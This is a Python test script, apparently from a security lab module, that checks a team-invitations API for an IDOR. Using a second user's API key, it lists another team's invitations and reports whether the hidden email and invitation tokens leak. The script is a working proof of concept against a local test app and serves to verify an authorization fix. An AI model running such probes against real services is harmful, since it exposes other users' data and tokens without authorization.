"""BREAK: remaining invitation IDOR. POST create is gated; GET list still trusts team_id."""

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from app.auth import API_KEY_A, API_KEY_B
from app.invitations import listInvitations, reset_for_tests
from app.scripts.module09_test_suite import call


def post(path, key, payload):
    status, _, body = call(
        "POST",
        path,
        body=json.dumps(payload).encode(),
        headers={"X-API-Key": key},
    )
    return status, json.loads(body.decode() or "{}")


def get(path, key):
    status, _, body = call("GET", path, headers={"X-API-Key": key})
    return status, json.loads(body.decode() or "{}")


def main():
    reset_for_tests()
    _, team = post("/teams", API_KEY_A, {"name": "secret-team"})
    team_id = team["id"]
    _, invite = post(
        f"/teams/{team_id}/invitations",
        API_KEY_A,
        {"email": "hidden.user@example.com"},
    )
    create_b, _ = post(
        f"/teams/{team_id}/invitations",
        API_KEY_B,
        {"email": "attacker@example.com"},
    )
    list_b, list_body = get(f"/teams/{team_id}/invitations", API_KEY_B)
    items = list_body.get("items") or []
    emails = [row.get("email") for row in items]
    tokens = [row.get("token") for row in items]
    print("BREAK_TEAM_ID", team_id)
    print("BREAK_POST_CREATE_B_STATUS", create_b)
    print("BREAK_POST_IDOR_BLOCKED", create_b == 403)
    print("BREAK_GET_LIST_B_STATUS", list_b)
    print("BREAK_GET_LIST_COUNT", len(items))
    print("BREAK_GET_LIST_SAW_HIDDEN_EMAIL", "hidden.user@example.com" in emails)
    print("BREAK_GET_LIST_SAW_TOKEN", any(tokens))
    print("BREAK_LIST_HELPER_NO_MEMBERSHIP_CHECK", "principal_id" in listInvitations.__code__.co_varnames)
    print("BREAK_IDOR_SURFACE", "GET /teams/{team_id}/invitations")


if __name__ == "__main__":
    main()
